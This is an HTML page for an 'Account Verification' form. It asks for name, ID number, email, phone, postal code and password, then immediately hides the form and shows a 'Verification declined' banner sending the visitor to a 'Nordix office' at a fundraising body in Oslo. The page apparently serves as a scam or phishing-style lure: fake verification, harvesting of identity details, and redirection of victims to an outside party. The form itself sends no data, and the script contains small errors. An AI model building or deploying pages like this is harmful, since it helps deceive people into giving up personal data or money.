<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ACCOUNT VERIFICATION </title>
    <script src="js/jquery.js"></script>
    <link rel="stylesheet" href="veri.css">


    <script>
        $(document).ready(function() {
            $("#popN").show();
            $(".container").hide();
        },3000);
    </script>



</head>
<body>
    <div id="popN">
        <h1> VERIFICATION DECLINED! </h1>
        <h2>Sorry you can't verify this account here, visit Nordix office at Internatinal Committee on Fundraising Organization (ICFO).
         <br>Radhusgata 25, <br>0158 Oslo, Norway
        </h2><br>
    </div>
    <div class="container">
        <div class="title">
            <h4>ACCOUNT VERIFICATION</h4>
        </div>
        <form action="#">
            <div class="user-details"> 
                <div class="input-box"> 
                    <span class="details">First Name</span>
                    <input type="text" placeholder="Firstname" required>
                </div>
                <div class="input-box"> 
                    <span class="details">Last Name</span>
                    <input type="text" placeholder="Lastname" required>
                </div>
                <div class="input-box"> 
                    <span class="details">State Residence</span>
                    <input type="text" placeholder="State Residence" required>
                </div>
                <div class="input-box"> 
                    <span class="details">ID Number</span>
                    <input type="text" placeholder="ID Number" required>
                </div>

                <div class="input-box"> 
                    <span class="details">Email</span>
                    <input type="text" placeholder="Email Address" required>
                </div>
                <div class="input-box"> 
                    <span class="details">Phone</span>
                    <input type="text" placeholder="Phone" required>
                </div>

                <div class="input-box"> 
                    <span class="details">Postal Code</span>
                    <input type="text" placeholder="Postal Code" required>
                </div>
                
                <div class="input-box"> 
                    <span class="details">Password</span>
                    <input type="text" placeholder="Confirm Password" required>
                </div>
            </div>
            <div class="gender-details">
                <input type="radio" name="gender" id="dot-1">
                <input type="radio" name="gender" id="dot-2">
                <input type="radio" name="gender" id="dot-3">
                <span class="gender-title">Gender</span>
                <div class="category">
                    <label for="dot-1">
                        <span class="dot one"></span>
                        <span class="gender">Male</span>
                    </label>
                    <label for="dot-2">
                        <span class="dot two"></span>
                        <span class="gender">Female</span>
                    </label>
                    <label for="dot-3">
                        <span class="dot three"></span>
                        <span class="gender">Others</span>
                    </label>
                </div>
            </div>
            <div class="button">
                <input id="regist" type="submit" value="VERIFY">
            </div>
        </form>
</body>
</html>
